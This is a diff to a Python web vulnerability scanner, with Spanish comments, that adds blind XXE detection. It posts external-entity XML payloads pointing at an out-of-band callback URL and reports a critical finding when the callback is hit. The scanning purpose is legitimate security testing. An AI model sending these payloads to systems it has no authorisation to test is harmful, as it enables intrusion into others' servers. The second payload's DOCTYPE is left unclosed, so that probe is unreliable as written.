@@ -1,5 +1,6 @@
+import contextlib
 import re
-from typing import Optional
+from typing import Any, Optional
 from urllib.parse import urljoin, urlparse
 
 import requests
@@ -35,7 +36,12 @@ XML_CONTENT_TYPES = {"application/xml", "text/xml", "application/soap+xml"}
 XML_ENDPOINT_PATTERNS = ["/xml", "/soap", "/api/xml", "/wsdl", "/.xml"]
 
 
-def check_xxe(url: str, html_content: str = "", session: Optional[requests.Session] = None) -> list[dict[str, str]]:
+def check_xxe(
+    url: str,
+    html_content: str = "",
+    session: Optional[requests.Session] = None,
+    oast_client: Optional[Any] = None,
+) -> list[dict[str, str]]:
     results: list[dict[str, str]] = []
     client = session if session is not None else requests
 
@@ -64,6 +70,7 @@ def check_xxe(url: str, html_content: str = "", session: Optional[requests.Sessi
             continue
         seen.add(target)
 
+        # 1. Pruebas in-band (búsqueda de firmas de archivos en la respuesta)
         for payload in XXE_PAYLOADS:
             baseline = ""
             try:
@@ -90,5 +97,30 @@ def check_xxe(url: str, html_content: str = "", session: Optional[requests.Sessi
 
                 except requests.RequestException:
                     continue
+
+        # 2. Pruebas Fuera de Banda (Blind XXE vía OAST)
+        if oast_client is not None:
+            token = oast_client.generate_token(prefix="xxe")
+            cb_url = oast_client.get_callback_url(token)
+            blind_payloads = [
+                f'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "{cb_url}">%ext;]><root><test>1</test></root>',
+                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{cb_url}"><foo>&xxe;</foo>',
+            ]
+            for b_payload in blind_payloads:
+                for content_type in XML_CONTENT_TYPES:
+                    with contextlib.suppress(requests.RequestException):
+                        client.post(target, data=b_payload, headers={"Content-Type": content_type}, timeout=5)
+            interactions = oast_client.poll_interactions(token)
+            if interactions:
+                results.append({
+                    "vuln": "Blind XML External Entity Injection (Blind XXE - OAST)",
+                    "risk": "Critico",
+                    "detail": (
+                        f"Vulnerabilidad Blind XXE confirmada en '{target}'. El procesador XML del servidor resolvió "
+                        f"una entidad externa y conectó al servidor OAST (interacciones recibidas: {len(interactions)})."
+                    ),
+                    "confidence": "confirmed",
+                })
+                return results
 
     return results
